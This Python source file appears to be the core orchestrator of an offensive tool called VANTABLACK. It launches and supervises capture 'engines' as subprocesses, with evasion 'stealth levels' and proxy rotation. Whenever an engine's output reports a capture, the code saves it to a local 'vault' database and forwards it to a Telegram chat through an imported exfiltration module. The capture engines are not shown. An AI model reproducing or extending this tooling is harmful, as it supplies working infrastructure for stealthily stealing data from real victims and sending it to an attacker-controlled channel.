import os
import time
import subprocess
import yaml
import json
import signal
from threading import Thread, Event
from rich.console import Console
from .db import VantaDatabase
from .supervisor import VantaSupervisor
from .api_listener import start_api
from ..modules.exfiltration import TelegramReporter
from ..modules.evasion import VantaEvasion
from ..modules.proxy import VantaProxy

console = Console()
STOP_EVENT = Event()

class VantaModularOrchestrator:
    """
    CLASS: VantaModularOrchestrator
    ROLE: Integrates all modules for ultra-resilient orchestration.
    """
    def __init__(self, config_path="hitch_config.yaml", args=None):
        self.config_path = config_path
        self.args = args
        self.processes = {}
        self.load_config()
        
        # Sub-systems initialization
        self.db = VantaDatabase(db_path="hitch_vault.db")
        self.supervisor = VantaSupervisor(self)
        self.evasion = VantaEvasion(stealth_level=args.stealth_level if args else 1)
        self.proxy = VantaProxy(proxy_list_path=args.proxy_list if args else None)
        
        # Launching the nervous system (API Webhook)
        start_api(host="127.0.0.1", port=8000)
        
        tg_conf = self.config.get("telegram", {})
        self.tg_reporter = TelegramReporter(tg_conf.get("token"), tg_conf.get("chat_id"))

    def load_config(self):
        """LOADS the configuration file."""
        if os.path.exists(self.config_path):
            with open(self.config_path, 'r') as f:
                self.config = yaml.safe_load(f)
        else:
            self.config = {"name": "VANTABLACK", "version": "3.0.0"}

    def log(self, message, level="info"):
        """LOGS a message with stylized formatting."""
        level_style = {"info": "cyan", "warning": "yellow", "error": "bold red"}.get(level, "white")
        console.print(f"[[{level.upper()}]] {message}", style=level_style)
        self.db.init_db() # Ensure tables exist

    def start_engine(self, name, cmd_list):
        """STARTS an engine and monitors it."""
        def run():
            while not STOP_EVENT.is_set():
                try:
                    proc = subprocess.Popen(
                        cmd_list, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, 
                        text=True, start_new_session=True, bufsize=1
                    )
                    self.processes[name] = proc
                    self.log(f"{name} Engine started.")
                    
                    while True:
                        line = proc.stdout.readline()
                        if not line: break
                        if STOP_EVENT.is_set(): break
                        
                        clean_line = line.strip()
                        # Persistence in DB
                        if "captured" in clean_line.lower():
                            self.db.save_capture(name, clean_line, self.evasion.stealth_level)
                            self.tg_reporter.send_log(f"Capture {name}: {clean_line}")
                        
                        # Filtered display (optional)
                    if STOP_EVENT.is_set(): break
                    time.sleep(5)
                except Exception as e:
                    self.log(f"Error in {name}: {e}", "error")
        Thread(target=run, daemon=True).start()

    def stop(self):
        """STOPS all active engines and sub-systems."""
        STOP_EVENT.set()
        for name, proc in self.processes.items():
            try: os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except: pass
        self.supervisor.stop()
